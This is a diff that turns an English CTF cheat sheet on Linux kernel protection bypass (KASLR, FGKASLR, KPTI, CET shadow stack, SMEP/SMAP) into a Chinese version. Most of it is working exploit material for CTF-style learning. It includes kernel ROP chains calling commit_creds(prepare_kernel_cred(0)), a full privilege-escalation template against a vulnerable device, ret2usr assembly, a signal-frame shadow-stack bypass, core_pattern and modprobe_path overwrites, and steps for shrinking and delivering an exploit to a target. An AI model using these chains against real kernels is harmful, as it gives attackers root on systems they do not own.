@@ -1,120 +1,116 @@
-# CTF Pwn - Kernel Protection Bypass
+---
 
-## Table of Contents
-- [KASLR and FGKASLR Bypass](#kaslr-and-fgkaslr-bypass)
-  - [KASLR Bypass via Stack Leak (hxp CTF 2020)](#kaslr-bypass-via-stack-leak-hxp-ctf-2020)
-  - [FGKASLR Bypass (hxp CTF 2020)](#fgkaslr-bypass-hxp-ctf-2020)
-- [KPTI Bypass Methods](#kpti-bypass-methods)
-  - [Method 1: swapgs_restore Trampoline](#method-1-swapgs_restore-trampoline)
-  - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
-  - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
-  - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
-- [CET Shadow Stack (SHSTK) and IBT — Signal-Frame Bypass (Wolv / IERAE 2024)](#cet-shadow-stack-shstk-and-ibt--signal-frame-bypass-wolv--ierae-2024)
-- [SMEP / SMAP Bypass](#smep--smap-bypass)
-- [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)
-- [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
-- [Initramfs and virtio-9p Workflow](#initramfs-and-virtio-9p-workflow)
-- [Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL](#finding-symbol-offsets-without-config_kallsyms_all)
-- [Exploit Templates](#exploit-templates)
-  - [Full Kernel ROP Template (SMEP + KPTI)](#full-kernel-rop-template-smep--kpti)
-  - [ret2usr Template (No SMEP/SMAP)](#ret2usr-template-no-smepsmap)
-- [Exploit Delivery](#exploit-delivery)
+phase: binary
+vuln_class: [pwn, kernel, kaslr, kpti, smep, smap, cet]
+title: 内核保护绕过
+summary: 保护不是一层，是四层各自挡不同的东西——KASLR 挡「不知道地址」，KPTI 挡「回不去用户态」，SMEP/SMAP 挡「借用户态内存」，CET 挡「伪造返回地址」。判据是先确认开了哪几层。
+---
+
+# 内核保护绕过
+
+内核基础（环境、堆喷、栈溢出、提权、`modprobe_path`、`core_pattern`）见 [[binary/漏洞利用/kernel.md|内核基础]]；进阶手法（`tty_struct` kROP、uffd、SLUB、跨缓存、PTE 重叠）见 [[binary/漏洞利用/kernel-techniques.md|内核进阶]]。
+
+## 0. 判据速查
+
+| 卡在哪 | 说明 | 去哪节 |
+|---|---|---|
+| 不知道内核基址 | KASLR 挡的是「地址未知」，不是「地址不可算」 | §1 |
+| 有基址但函数地址还是乱 | FGKASLR 逐函数随机化 | §2 |
+| `commit_creds` 成功但回不到用户态 | KPTI 的 CR3 没换回来 | §3 |
+| `iretq` 回来就 SIGSEGV | 可能是 KPTI，也可能是 CET | §3、§4 |
+| 跳到用户态代码被拒 | SMEP | §5 |
+| 内核读用户态内存失败 | SMAP | §5 |
+| `RET` 触发 `#CP` | 影子栈不匹配（CET-SHSTK） | §4 |
+| `/proc/kallsyms` 里没有 `modprobe_path` | 缺 `CONFIG_KALLSYMS_ALL` | §8 |
+| 调试时模块地址全是 0 | `/proc/modules` 需要 root | §6 |
 
 ---
 
-## KASLR and FGKASLR Bypass
+## 1. KASLR
 
-### KASLR Bypass via Stack Leak (hxp CTF 2020)
-
-Leak a kernel text pointer from the stack to compute the KASLR (Kernel Address Space Layout Randomization) slide:
+### 栈泄漏（最通用）
 
 ```c
-// Kernel base without KASLR
-#define KERNEL_BASE 0xffffffff81000000
+#define KERNEL_BASE 0xffffffff81000000      // 无 KASLR 时的基址
 
 unsigned long leak[40];
-read(fd, leak, sizeof(leak));  // oversized read from vulnerable module
+read(fd, leak, sizeof(leak));               // 模块的越界读
 
-// leak[38] contains a randomized kernel text pointer
+// leak[38] 里是随机化后的内核代码指针
 unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;
 
-// Apply offset to all addresses
-unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
-unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
+unsigned long commit_creds_kaslr  = commit_creds + kaslr_offset;
+unsigned long pop_rdi_ret_kaslr   = pop_rdi_ret + kaslr_offset;
 ```
 
-**Other KASLR leak sources:**
-- `/proc/kallsyms` (if `kptr_restrict != 1`)
-- `dmesg` (if `dmesg_restrict != 1`)
-- Kernel oops messages (if oops doesn't panic)
-- UAF reading freed kernel objects containing text pointers
-- `modprobe_path` has 1-byte entropy — brute-forceable with AAW
+**关键**：掩掉低 16 位（`& 0xffffffffffff0000`）再减基址，否则页内偏移会污染 slide。
 
-### FGKASLR Bypass (hxp CTF 2020)
+### 其他泄漏源
 
-FGKASLR (Function Granular KASLR) randomizes individual functions, but the early `.text` section (up to approximately offset `0x400dc6`) remains at a fixed offset from the kernel base. Gadgets from this range are safe to use.
+- `/proc/kallsyms`（`kptr_restrict != 1` 时）
+- `dmesg`（`dmesg_restrict != 1` 时）
+- 内核 oops 消息（oops 不 panic 时）
+- UAF 读释放对象里的代码指针
+- **`modprobe_path` 只有 1 字节熵**——有 AAW 时可爆破
 
-**Method 1: Use only unaffected `.text` gadgets**
+---
+
+## 2. FGKASLR
+
+FGKASLR（Function Granular KASLR）逐函数随机化，但 `.text` 前段（约到 offset `0x400dc6`）仍相对内核基址固定——这段里的 gadget 可以放心用。
+
+### 方法一：只用未随机化段的 gadget
 
 ```bash
-# Find gadgets only in the non-randomized range
 ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
     awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
 ```
 
-`swapgs_restore_regs_and_return_to_usermode` is located in the unaffected `.text` section and can be used with only the KASLR base offset.
+`swapgs_restore_regs_and_return_to_usermode` 就在这段里，只需要 KASLR 基址偏移即可。
 
-**Method 2: Resolve randomized functions via `__ksymtab`**
+### 方法二：从 `__ksymtab` 解出随机化函数
 
-`__ksymtab` entries use relative offsets, not absolute addresses. The `__ksymtab` section itself is not randomized by FG-KASLR:
+`__ksymtab` 用**相对偏移**而非绝对地址，且它自己不被 FG-KASLR 随机化：
 
 ```c
 // struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
-// Real address = &ksymtab_entry + entry.value_offset
+// 真实地址 = &ksymtab_entry + entry.value_offset
 
-unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // from /proc/kallsyms
-unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;
+unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc;  // 从 /proc/kallsyms
+unsigned long ksymtab_commit_creds         = 0xffffffff81f87d90;
 
-// ROP chain to read ksymtab entry and compute real address:
-// 1. Load ksymtab address into rax
 payload[off++] = pop_rax_ret + kaslr_offset;
 payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
-// 2. Read 4-byte relative offset: mov eax, [rax]
-payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
+payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;   // 读 4 字节相对偏移
 payload[off++] = 0x0;
-// 3. Return to userland to compute: real_addr = ksymtab_addr + kaslr_offset + offset
-payload[off++] = kpti_trampoline + kaslr_offset + 22;
+payload[off++] = kpti_trampoline + kaslr_offset + 22;         // 先回用户态算
 payload[off++] = 0; payload[off++] = 0;
 payload[off++] = (unsigned long)resolve_and_continue;
-// ...
 
 void resolve_and_continue() {
-    // eax contains the relative offset read from ksymtab
     unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
-    // Now use resolved address in next ROP stage
+    // 用 resolved 组第二段 ROP 再进内核
 }
 ```
 
-**Key insight:** FG-KASLR requires a multi-stage exploit: first return to userland to compute resolved addresses from `__ksymtab` offsets, then re-enter the kernel with a second ROP chain using the resolved function addresses.
+**关键**：FG-KASLR 下必须**多阶段**——先回用户态把地址算出来，再用解出的地址重新进内核。
 
 ---
 
-## KPTI Bypass Methods
+## 3. KPTI
 
-KPTI (Kernel Page Table Isolation) separates kernel and user page tables. A simple `swapgs; iretq` fails because the user page table is not restored. Four bypass approaches:
+KPTI 隔离内核页表与用户页表。裸 `swapgs; iretq` 会失败，因为用户页表没被换回来。四条路：
 
-### Method 1: swapgs_restore Trampoline
+### 方法一：`swapgs_restore` trampoline
 
-The kernel function `swapgs_restore_regs_and_return_to_usermode` handles the full KPTI return sequence. Jump to offset +22 to skip the register-restore prologue and land directly at the CR3-swap + `swapgs` + `iretq` sequence:
+`swapgs_restore_regs_and_return_to_usermode` 内含完整的 KPTI 返回序列。跳到 **+22 偏移**跳过寄存器恢复前奏，直接落在换 CR3 + `swapgs` + `iretq` 那段：
 
 ```c
-// Symbol from /proc/kallsyms or vmlinux
-unsigned long kpti_trampoline = 0xffffffff81200f10;
+unsigned long kpti_trampoline = 0xffffffff81200f10;   // 从 /proc/kallsyms 或 vmlinux
 
-// In ROP chain, after commit_creds:
-payload[off++] = kpti_trampoline + 22;  // skip to mov rdi,rsp; ... swapgs; iretq
-payload[off++] = 0x0;                    // padding (popped by trampoline)
-payload[off++] = 0x0;                    // padding
+payload[off++] = kpti_trampoline + 22;
+payload[off++] = 0x0;                  // trampoline 会弹掉的两个填充
+payload[off++] = 0x0;
 payload[off++] = user_rip;
 payload[off++] = user_cs;
 payload[off++] = user_rflags;
@@ -122,20 +118,15 @@ payload[off++] = user_sp;
 payload[off++] = user_ss;
 ```
 
-**Key insight:** The +22 offset skips the function's register pop/restore sequence and enters directly at the point where it swaps CR3, does `swapgs`, and `iretq`. This offset may vary between kernel versions — verify by disassembling the function.
+**坑**：+22 这个偏移**随内核版本变**，必须反汇编该函数确认（找 `mov rdi, rsp` 之后的 `swapgs`）。
 
-### Method 2: Signal Handler (SIGSEGV)
+### 方法二：信号处理器
 
-Register a SIGSEGV handler before the exploit. When `iretq` returns without KPTI handling, the page fault triggers SIGSEGV, which the handler catches to spawn a shell:
+先注册 SIGSEGV 处理器。`iretq` 未做 KPTI 处理就返回，缺页触发 SIGSEGV，处理器接管：
 
 ```c
-#include <signal.h>
+void spawn_shell() { if (getuid() == 0) system("/bin/sh"); }
 
-void spawn_shell() {
-    if (getuid() == 0) system("/bin/sh");
-}
-
-// Before exploit:
 struct sigaction sa;
 sa.sa_handler = spawn_shell;
 sigemptyset(&sa.sa_mask);
@@ -143,74 +134,63 @@ sa.sa_flags = 0;
 sigaction(SIGSEGV, &sa, NULL);
 ```
 
-The ROP chain still calls `commit_creds(prepare_kernel_cred(0))` and does `swapgs; iretq` to userland. Even though the return faults due to wrong page table, the credentials are already committed. The SIGSEGV handler runs with root privileges.
+ROP 链照样 `commit_creds(prepare_kernel_cred(0))` 再 `swapgs; iretq`。**即使返回因页表错误而崩，凭据已经提交了**——SIGSEGV 处理器跑的时候已经是 root。
 
-### Method 3: modprobe_path via ROP
+### 方法三：ROP 里直接改 `modprobe_path`
 
-Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain using `pop rax; pop rdi; mov [rdi], rax; ret` gadgets. No KPTI handling needed — the write happens entirely in kernel context.
+不回用户态，用 `pop rax; pop rdi; mov [rdi], rax; ret` 在 ROP 链里写 `modprobe_path`。写发生在内核上下文，完全不需要 KPTI 处理。详见 [[binary/漏洞利用/kernel.md|内核基础]]。
 
-See [[binary/漏洞利用/kernel.md#modprobe_path-overwrite|kernel.md - modprobe_path Overwrite]] for the full technique, trigger sequence, and ROP payload.
+### 方法四：ROP 里改 `core_pattern`
 
-### Method 4: core_pattern via ROP
-
-Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|/evil"`). When any process crashes, the kernel executes the piped program as root.
-
-See [[binary/漏洞利用/kernel.md#core_pattern-overwrite|kernel.md - core_pattern Overwrite]] for the full technique and how to find the `core_pattern` address.
+同上，把 `core_pattern` 写成管道命令（`"|/evil"`）。任意进程崩了内核就以 root 执行它。
 
 ---
 
-## CET Shadow Stack (SHSTK) and IBT — Signal-Frame Bypass (Wolv / IERAE 2024)
+## 4. CET：影子栈（SHSTK）与 IBT
 
-**Protections:**
-- **SHSTK (Shadow Stack):** Hardware shadow stack at `SSP` (shadow stack pointer) — every `CALL` pushes return address to both normal stack and shadow stack; `RET` checks they match. Kernel enforces via `WRSS`/`WRUSS` and `MSR_IA32_PL0_SSP`.
-- **IBT (Indirect Branch Tracking):** Indirect calls/jmps must land on `ENDBR64`.
+- **SHSTK**：硬件影子栈在 `SSP`。每次 `CALL` 同时压入普通栈和影子栈，`RET` 检查两者一致。内核用 `WRSS`/`WRUSS` 和 `MSR_IA32_PL0_SSP` 维护。
+- **IBT**：间接 call/jmp 必须落在 `ENDBR64` 上。
 
-**Why signal frames bypass SHSTK:** On `sigreturn` / `sigaltstack`, the kernel *restores* the user thread's shadow stack pointer from the signal frame's `xsave` area (`struct sigcontext` + `xsaves`). Userspace controls that frame, so an attacker can set `SSP` to an attacker-controlled shadow stack that contains the ROP return addresses.
+### 为什么信号帧能绕过影子栈
 
-**Wolv / IERAE 2024 pattern (used at Pwn2Own / CTF kernel challenges with CET enabled):**
+`sigreturn`/`sigaltstack` 时，内核会从信号帧的 `xsave` 区（`struct sigcontext` + `xsaves`）**恢复**用户的 `SSP`。而信号帧由用户态控制——攻击者可以把 `SSP` 指到自己造的影子栈上，里面放好 ROP 返回地址。
 
 ```c
-// 1. Prepare alt signal stack that is also a valid shadow stack
+// 1. 准备一块既当备用信号栈、又当合法影子栈的内存
 void *shstk_mem = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0);
 unsigned long ssp = (unsigned long)shstk_mem + 0x2000 - 8;
 
- // 2. Mark it as shadow stack (requires CET arch_prctl)
-arch_prctl(ARCH_SHSTK_ENABLE, ...); // ARCH_SHSTK_ENABLE = 0x5001; or kernel auto-marks sigaltstack
+// 2. 标记为影子栈
+arch_prctl(ARCH_SHSTK_ENABLE, ...);       // 0x5001；部分内核会自动标记 sigaltstack
 arch_prctl(ARCH_CET_ALLOC_SHSTK, &ssp);
 
-// 3. Push attacker ROP addresses onto shadow stack (must mirror normal stack)
-*(unsigned long *)ssp = (unsigned long)pop_rdi_ret;
-*(unsigned long *)(ssp - 8) = 0;
+// 3. 把 ROP 地址压进影子栈（必须与普通栈镜像一致）
+*(unsigned long *)ssp        = (unsigned long)pop_rdi_ret;
+*(unsigned long *)(ssp - 8)  = 0;
 *(unsigned long *)(ssp - 16) = (unsigned long)prepare_kernel_cred;
 
-// 4. Raise signal with controlled sigframe that restores SSP to ssp
+// 4. 用可控信号帧把 SSP 恢复成 ssp
 struct sigaction sa = { .sa_sigaction = handler, .sa_flags = SA_SIGINFO | SA_ONSTACK };
 sigaltstack(&(stack_t){ .ss_sp = shstk_mem, .ss_size = 0x2000, .ss_flags = 0 }, NULL);
 sigaction(SIGUSR1, &sa, NULL);
 
-// handler builds fake sigcontext at its stack:
 void handler(int sig, siginfo_t *info, void *ucontext) {
     ucontext_t *uc = (ucontext_t *)ucontext;
-    // Overwrite SSP in the saved xsave area that sigreturn will restore
-    // On x86-64 cet, SSP is at uc->uc_mcontext.__ssp (or xsaves offset 0x1f8)
-    uc->uc_mcontext.__ssp = ssp - 16; // point to our fake shadow stack
-    // Also set normal RSP/RIP for the rop chain
+    // x86-64 CET 下 SSP 在 uc->uc_mcontext.__ssp（或 xsaves offset 0x1f8）
+    uc->uc_mcontext.__ssp = ssp - 16;
     uc->uc_mcontext.gregs[REG_RSP] = (unsigned long)rop_chain;
     uc->uc_mcontext.gregs[REG_RIP] = (unsigned long)pop_rdi_ret;
 }
 
-// 5. Trigger sigreturn — kernel does WRSS to restore SSP from uc->uc_mcontext.__ssp
-raise(SIGUSR1);
-// → sigreturn restores both normal stack and shadow stack to attacker values
-// → RET now succeeds because shadow stack matches normal stack
+raise(SIGUSR1);      // sigreturn 时内核用 WRSS 把 SSP 恢复成我们给的值
 ```
 
-**Simpler variant — direct `sigreturn` ROP without `arch_prctl`:**
+### 简化版：直接 sigreturn ROP
+
 ```python
 from pwn import *
 
-# If the exploit already has an arbitrary write to set up a fake signal frame on stack:
 frame = SigreturnFrame()
 frame.rax = constants.SYS_execve
 frame.rdi = binsh_addr
@@ -218,165 +198,131 @@ frame.rsi = 0
 frame.rdx = 0
 frame.rip = syscall_ret
 frame.rsp = normal_rop_addr
-# NOTE: pwntools SigreturnFrame has no ssp field. For CET shadow-stack control,
-# build the raw frame then patch the SSP slot in the xsave area manually, and
-# push a matching shadow-stack ROP pivot so RET pairs with the restored SSP:
+
+# pwntools 的 SigreturnFrame 没有 ssp 字段。要控影子栈就手工改 xsave 区里的 SSP 槽
 raw = bytearray(bytes(frame))
-# SSP lives in the signal frame's shadow-stack area (bytes 0x1e8-0x200 on
-# CET-aware kernels); overwrite it so the kernel restores a valid SSP on sigreturn
-ssp_offset = 0x1e8
+ssp_offset = 0x1e8        # CET-aware 内核上 SSP 在信号帧 0x1e8-0x200
 raw[ssp_offset:ssp_offset + 8] = p64(fake_shstk_addr)
-# Mirror the normal-stack ROP chain onto the fake shadow stack so each RET
-# finds the same return address on both stacks
+
+# 普通栈的 ROP 链要镜像到假影子栈，保证每次 RET 两边都能对上
 fake_shstk = flat([pop_rdi_ret, 0, prepare_kernel_cred])
 ```
 
-**Key insights:**
-- CET's shadow stack is *not* a barrier if the attacker can trigger a signal — `sigreturn` is a privileged `WRSS` gadget that restores `SSP` from userspace-controlled memory.
-- IBT is bypassed together: signal handler return uses `IRET`, not an indirect `JMP`, so `ENDBR64` is not checked. Once `SSP` is controlled, standard kROP works.
-- On kernels without `ARCH_CET_ALLOC_SHSTK`, the attacker can reuse the existing shadow stack mapping and just overwrite its contents via a prior write primitive, then pivots `SSP` via the signal frame by `SHSTK` offset.
-- Detection: check `cat /proc/cpuinfo | grep cet`, and `rdmsr 0x6a2` (IA32_PL0_SSP) or `arch_prctl(ARCH_CET_STATUS)` — if CET is enabled, any RIP hijack must be paired with shadow stack control.
+**关键三条**：
+- 影子栈**不是**屏障——只要能触发信号，`sigreturn` 就是一个特权的 `WRSS` gadget，会从用户可控内存恢复 `SSP`
+- IBT 一起被绕过：信号处理器返回走 `IRET`，不是间接 `JMP`，不检查 `ENDBR64`
+- 没有 `ARCH_CET_ALLOC_SHSTK` 的内核上，可以复用已有的影子栈映射，用先前的写原语改内容，再通过信号帧把 `SSP` 指过去
 
-**References:** Wolv / IERAE — *Bypassing Intel CET with Signal Frames* (2024), Black Hat Asia 2024; kernel patch `x86/cet: handle signal shadow stack`.
-
-## SMEP / SMAP Bypass
-
-**SMEP (Supervisor Mode Execution Prevention):** Blocks executing userland pages from kernel mode.
-- **Bypass:** Use kernel ROP (kROP) chains — all gadgets from kernel `.text`. See [[binary/漏洞利用/kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds|kernel.md - Kernel ROP]].
-
-**SMAP (Supervisor Mode Access Prevention):** Blocks accessing userland memory from kernel mode.
-- **Bypass:** kROP with heap-resident chain (all data in kernel heap), or `stac`/`clac` gadgets to temporarily disable SMAP.
-
-**Direct CR4 modification (old kernels):** Write to CR4 to clear SMEP/SMAP bits. Blocked on modern kernels by `native_write_cr4()` pinning.
+**检测**：`cat /proc/cpuinfo | grep cet`、`rdmsr 0x6a2`（IA32_PL0_SSP）、`arch_prctl(ARCH_CET_STATUS)`。CET 开着就说明任何 RIP 劫持都必须配影子栈控制。
 
 ---
 
-## KPTI / SMEP / SMAP Quick Reference
+## 5. SMEP / SMAP
 
-| Protection | Blocks | Bypass |
-|-----------|--------|--------|
-| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [[binary/漏洞利用/kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds|kernel.md]] |
-| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
-| No SMEP/SMAP | (nothing) | [[binary/漏洞利用/kernel.md#ret2usr-no-smepsmap|ret2usr]] — directly call userland privesc function |
-| KPTI | Kernel page table isolation | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |
+| 保护 | 挡什么 | 绕过 |
+|---|---|---|
+| SMEP | 内核态执行用户页 | kROP（gadget 全从内核 `.text` 取） |
+| SMAP | 内核态访问用户内存 | kROP + 链放内核堆；或用 `stac`/`clac` gadget 临时开 |
+| 都无 | 无 | ret2usr——直接在内核态调用户态提权函数 |
+| KPTI | 内核页表隔离 | §3 的四种方法 |
 
-See [KPTI Bypass Methods](#kpti-bypass-methods) for detailed bypass techniques with code.
+**老内核的 CR4 直改**：写 CR4 清 SMEP/SMAP 位。现代内核被 `native_write_cr4()` 钉住，不可行。
 
 ---
 
-## GDB Kernel Module Debugging
-
-Load vulnerable kernel module symbols in GDB for source-level debugging:
+## 6. GDB 调内核模块
 
 ```bash
-# 1. Find module load address (as root inside QEMU)
+# 1. QEMU 里以 root 找模块加载地址
 cat /proc/modules
 # vuln 16384 0 - Live 0xffffffffc0000000 (O)
 
-# 2. In GDB, load module symbols at that address
+# 2. GDB 里按该地址加载符号
 (gdb) target remote localhost:1234
 (gdb) add-symbol-file vuln.ko 0xffffffffc0000000
-(gdb) b swrite            # breakpoint on module function
+(gdb) b swrite
 (gdb) c
 
-# 3. Inspect stack after breakpoint hit
-(gdb) x/20xg $rsp-0x90    # examine stack buffer
-(gdb) search "AAAAAAAA"   # find buffer location (pwndbg)
+# 3. 断下后看栈
+(gdb) x/20xg $rsp-0x90
+(gdb) search "AAAAAAAA"        # pwndbg 找缓冲区位置
 ```
 
-**Note:** `/proc/modules` requires root to read actual addresses. Non-root users see zeroed addresses. Modify `/init` to keep root for debugging.
+**坑**：`/proc/modules` 只有 root 能看真实地址，非 root 全是 0。调试时改 `/init` 保留 root。
 
 ---
 
-## Initramfs and virtio-9p Workflow
+## 7. initramfs 与 virtio-9p
 
-**Shared directory via virtio-9p** — transfer exploits between host and QEMU without rebuilding initramfs:
+### virtio-9p 共享目录（免重建 initramfs）
+
 ```bash
-# Add to QEMU launch script:
+# QEMU 启动参数
 -fsdev local,security_model=passthrough,id=fsdev0,path=./share \
 -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare
 
-# Inside QEMU guest (add to /init or run manually):
+# 客户机内（加进 /init 或手动跑）
 mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf
 
-# On host, compile exploit into shared directory:
+# 宿主机上直接编译进去
 gcc exploit.c -static -o ./share/exploit
 ```
 
-**Extract and modify initramfs:**
+### 解包与改 initramfs
+
 ```bash
-# Extract
 mkdir initramfs && cd initramfs
 gzip -dc ../initramfs.cpio.gz | cpio -idmv
 
-# Modify /init for debugging (get root shell instead of unprivileged user)
-# Comment out: exec su -l ctf
-# Add: /bin/sh
+# 改 /init：注释掉 exec su -l ctf，换成 /bin/sh 保留 root
 
-# Rebuild
 find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
 ```
 
-**Key modifications to `/init` for debugging:**
-- Comment out `exec su -l ctf` (or similar) to keep root privileges
-- Comment out `echo 1 > /proc/sys/kernel/kptr_restrict` to see `/proc/kallsyms`
-- Comment out `echo 1 > /proc/sys/kernel/dmesg_restrict` to see dmesg
-- Comment out `chmod 400 /proc/kallsyms` to read symbol addresses
+**`/init` 里要注释掉的四行**：
+- `exec su -l ctf`（保留 root）
+- `echo 1 > /proc/sys/kernel/kptr_restrict`（才能看 `/proc/kallsyms`）
+- `echo 1 > /proc/sys/kernel/dmesg_restrict`（才能看 dmesg）
+- `chmod 400 /proc/kallsyms`（才能读符号地址）
 
 ---
 
-## Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL
+## 8. 没有 `CONFIG_KALLSYMS_ALL` 时找数据符号
 
-`/proc/kallsyms` only shows `.text` symbols by default. Data symbols like `modprobe_path` and `core_pattern` require `CONFIG_KALLSYMS_ALL=y`.
+`/proc/kallsyms` 默认只列 `.text` 符号。`modprobe_path`、`core_pattern` 这类数据符号需要 `CONFIG_KALLSYMS_ALL=y`。
 
-**Finding modprobe_path:**
+### 找 `modprobe_path`
 
 ```bash
-# 1. Get call_usermodehelper_setup address (always in /proc/kallsyms)
+# 1. call_usermodehelper_setup 一定在 /proc/kallsyms 里
 cat /proc/kallsyms | grep call_usermodehelper_setup
 
-# 2. In GDB, set breakpoint and trigger
+# 2. GDB 下断并触发
 hb *0xffffffff810c8c80
-# Trigger: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x
+# 触发：echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x
 
-# 3. Check first argument (RDI = modprobe_path)
+# 3. 看第一个参数（RDI 就是 modprobe_path）
 (gdb) p/x $rdi
 # 0xffffffff8265ff00
 (gdb) x/s $rdi
 # "/sbin/modprobe"
 ```
 
-**Finding core_pattern:**
+### 找 `core_pattern`
 
-```bash
-# 1. Set breakpoint on override_creds (called by do_coredump)
-# 2. Crash a process: gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
-# 3. After override_creds returns, disassemble — look for data address in movzx
-```
+1. 在 `override_creds`（`do_coredump` 调用它）下断
+2. 崩一个进程：`gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'`
+3. `override_creds` 返回后反汇编，找 `movzx` 里的数据地址
 
 ---
 
-## Exploit Templates
+## 9. 模板
 
-### Full Kernel ROP Template (SMEP + KPTI)
-
-Complete exploit for kernel stack overflow with SMEP and KPTI enabled:
+### 完整 kROP（SMEP + KPTI）
 
 ```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <string.h>
-
-// Addresses from vmlinux (apply KASLR offset if needed)
-unsigned long prepare_kernel_cred;
-unsigned long commit_creds;
-unsigned long pop_rdi_ret;
-unsigned long mov_rdi_rax_pop1_ret;
-unsigned long kpti_trampoline;
-
-// Userland state
+unsigned long prepare_kernel_cred, commit_creds, pop_rdi_ret;
+unsigned long mov_rdi_rax_pop1_ret, kpti_trampoline;
 unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;
 
 void save_userland_state() {
@@ -391,53 +337,40 @@ void save_userland_state() {
     user_rip = (unsigned long)spawn_shell;
 }
 
-void spawn_shell() {
-    if (getuid() == 0) {
-        printf("[+] root!\n");
-        system("/bin/sh");
-    } else {
-        printf("[-] privesc failed\n");
-        exit(1);
-    }
-}
-
 int main() {
     save_userland_state();
     int fd = open("/dev/hackme", O_RDWR);
 
-    // Step 1: Leak canary + KASLR base
+    // 1. 泄 canary + KASLR
     unsigned long leak[40];
     read(fd, leak, sizeof(leak));
     unsigned long cookie = leak[16];
     unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;
 
-    // Step 2: Apply KASLR offset
     prepare_kernel_cred += kaslr_offset;
     commit_creds += kaslr_offset;
     pop_rdi_ret += kaslr_offset;
     mov_rdi_rax_pop1_ret += kaslr_offset;
     kpti_trampoline += kaslr_offset;
 
-    // Step 3: Build ROP chain
+    // 2. 组链
     unsigned long payload[50];
     int off = 16;
     payload[off++] = cookie;
-    payload[off++] = 0;  // rbx
-    payload[off++] = 0;  // r12
-    payload[off++] = 0;  // rbp
+    payload[off++] = 0;    // rbx
+    payload[off++] = 0;    // r12
+    payload[off++] = 0;    // rbp
 
-    // prepare_kernel_cred(0) → commit_creds(result)
     payload[off++] = pop_rdi_ret;
     payload[off++] = 0;
     payload[off++] = prepare_kernel_cred;
     payload[off++] = mov_rdi_rax_pop1_ret;
-    payload[off++] = 0;  // pop rbx padding
+    payload[off++] = 0;    // pop rbx 填充
     payload[off++] = commit_creds;
 
-    // KPTI-safe return to userland
     payload[off++] = kpti_trampoline + 22;
-    payload[off++] = 0;  // padding
-    payload[off++] = 0;  // padding
+    payload[off++] = 0;
+    payload[off++] = 0;
     payload[off++] = user_rip;
     payload[off++] = user_cs;
     payload[off++] = user_rflags;
@@ -445,11 +378,10 @@ int main() {
     payload[off++] = user_ss;
 
     write(fd, payload, sizeof(payload));
-    return 0;
 }
 ```
 
-### ret2usr Template (No SMEP/SMAP)
+### ret2usr（无 SMEP/SMAP）
 
 ```c
 void privesc() {
@@ -461,11 +393,11 @@ void privesc() {
         "movabs rax, %[commit_creds];"
         "call rax;"
         "swapgs;"
-        "mov r15, %[user_ss];   push r15;"
-        "mov r15, %[user_sp];   push r15;"
+        "mov r15, %[user_ss];     push r15;"
+        "mov r15, %[user_sp];     push r15;"
         "mov r15, %[user_rflags]; push r15;"
-        "mov r15, %[user_cs];   push r15;"
-        "mov r15, %[user_rip];  push r15;"
+        "mov r15, %[user_cs];     push r15;"
+        "mov r15, %[user_rip];    push r15;"
         "iretq;"
         ".att_syntax;"
         : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
@@ -478,25 +410,30 @@ void privesc() {
 
 ---
 
-## Exploit Delivery
+## 10. 投递
 
-Kernel exploits are typically large static binaries. Minimize size for remote delivery:
+内核利用通常是几十 KB 的静态二进制，远程投递要压体积：
 
 ```bash
-# 1. Compile with musl-libc (much smaller than glibc)
-musl-gcc -static -O2 -o exploit exploit.c
-
-# 2. Strip symbols
+musl-gcc -static -O2 -o exploit exploit.c     # musl 比 glibc 小得多
 strip exploit
-
-# 3. Compress and encode for transfer
 gzip exploit && base64 exploit.gz > exploit.b64
 
-# 4. On target: decode and decompress
+# 目标机上
 base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit
 
-# Optional: UPX compression (further reduces size)
-upx --best exploit
+upx --best exploit                             # 可选，进一步压
 ```
 
